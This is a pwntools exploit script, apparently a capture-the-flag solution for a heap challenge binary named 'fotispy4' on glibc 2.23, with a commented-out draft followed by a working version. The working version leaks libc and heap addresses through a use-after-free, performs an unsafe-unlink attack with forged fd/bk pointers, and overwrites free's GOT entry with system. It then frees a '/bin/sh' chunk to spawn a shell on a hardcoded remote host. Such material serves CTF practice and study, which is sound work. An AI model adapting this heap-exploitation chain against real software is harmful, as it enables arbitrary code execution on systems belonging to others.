#!/usr/bin/env python3
# from pwn import *

# context(os='linux', arch='amd64')
# elf = ELF('./fotispy4_patched', checksec=False)
# libc = ELF('./libc-2.23.so', checksec=False)

# # LOCAL / REMOTE
# if args.LOCAL:
#     p = process(elf.path)
# else:
#     p = remote('addr', 1337)

# def register(name, password):
#     p.sendlineafter(b'Choice: ', b'0')
#     p.sendlineafter(b'username: ', name)
#     p.sendlineafter(b'password: ', password)

# def change(idx):
#     p.sendlineafter(b'Choice: ', b'1')
#     p.sendlineafter(b'[0-15]: ', idx)

# def edit(name, password):
#     p.sendlineafter(b'Choice: ', b'2')
#     p.sendlineafter(b'name: ', name)
#     p.sendlineafter(b'password: ', password)

# def show():
#     p.sendlineafter(b'Choice: ', b'3')

# def delete():
#     p.sendlineafter(b'Choice: ', b'4')

# input()
# # 1. Leak libc
# register(b'A', b'A')
# register(b'B', b'B')
# register(b'C', b'C')
# register(b'D', b'D')
# delete()
# show()
# p.recvuntil(b'Username: ')
# libc_leak = u64(p.recvline()[:-1].ljust(8,b'\x00'))
# libc.address = libc_leak - 0x3c4b78
# log.info(f"Libc base: {hex(libc.address)}")

# # Addresses
# free_hook = libc.symbols['__free_hook']
# system = libc.symbols['system']

# log.info(f"__free_hook: {hex(free_hook)}")
# log.info(f"system: {hex(system)}")
# change(b'2')
# delete()
# show()
# p.recvuntil(b'Username: ')
# heap_base = u64(p.recvline()[:-1].ljust(8,b'\x00'))
# log.info(f"heap base: {hex(heap_base)}")
# # fd = free_hook - 0x18
# # bk = free_hook - 0x10
# # payload1 = p64(fd) + p64(bk)
# # payload2 = p64(0)*8 + p64(0x90) + p64(0x90)
# # edit(payload1, payload2)
# # change(b'1')
# # delete()


# p.interactive()

#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 5194
HOST = "52.59.124.14"
exe = context.binary = ELF('./fotispy4_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x000000000040097C
            b* 0x0000000000400BD1
            b* 0x0000000000400B60
            b* 0x0000000000400ADB
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(username, password):
    p.sendlineafter(b'Choice: ', str(0))
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'password: ', password)

def switch_user(idx):
    p.sendlineafter(b'Choice: ', str(1))
    p.sendlineafter(b'[0-15]: ', str(idx))

def edit(username, password):
    p.sendlineafter(b'Choice: ', str(2))
    p.sendlineafter(b'name: ', username)
    p.sendlineafter(b'password: ', password)

def show():
    p.sendlineafter(b'Choice: ', str(3))

def free():
    p.sendlineafter(b'Choice: ', str(4))

# VARIABLE


input()
# PAYLOAD
add(b'nhh', b'abcdxyz')
for i in range(6):
    add(b'user', b'password')
switch_user(0)
free()
show()
p.recvuntil(b'Username: ')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x3c4b78
log.info("Libc base: " + hex(libc.address))

payload = flat(
    0, 0x81,
    0x6020b0, 0x6020b8 #fd, bk
    )
switch_user(1)
edit(payload, b'\0'*0x40 + p64(0x80) + p64(0x90))
switch_user(2)
free()

switch_user(4)
free()
show()
p.recvuntil(b'Username: ')
heap_leak = u32(p.recv(4))
heap_base = heap_leak - 0xa0
log.info("Heap base: " + hex(heap_base))

switch_user(1)
edit(b'\0'*0x10 + p64(heap_base + 0x10) + p64(0x6020b0) + p64(exe.got.free), b'\0')

switch_user(2)
edit(p64(libc.sym.system) + p64(libc.sym.puts), p64(libc.sym.atoi))

switch_user(5)
edit(b'/bin/sh\0', b'\0')
free()

p.interactive()